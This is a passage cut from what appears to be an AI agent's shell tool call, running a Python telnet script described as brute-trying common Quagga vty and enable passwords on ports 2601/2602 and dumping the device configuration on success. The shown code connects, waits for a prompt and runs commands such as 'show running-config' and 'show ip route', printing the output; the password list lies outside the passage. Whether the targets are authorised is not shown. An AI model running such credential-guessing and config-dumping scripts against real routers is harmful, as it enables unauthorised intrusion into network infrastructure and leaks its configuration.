n data:\n                    ok=True\n                    break\n            if ok:\n                break\n    if not ok:\n        print("[!] Could not get prompt on",host,port)\n        tn.close()\n        continue\n    # run commands\n    for cmd in ["terminal length 0","show version","show running-config","show ip route","show interface","show protocols"]:\n        tn.write((cmd+"\\r\\n").encode())\n        time.sleep(0.4)\n        out=tn.read_very_eager()\n        print(f"==== {cmd} ====" )\n        print(out.decode(errors=\'ignore\'))\n    tn.write(b"exit\\r\\n")\n    tn.close()\nPY', 'description': 'Brute-try common Quagga vty and enable passwords on 2601/2602 and dump config if successful', 'timeout': 120000, 'run_in_background': False, 'dangerouslyDisableSandbox': False}; start
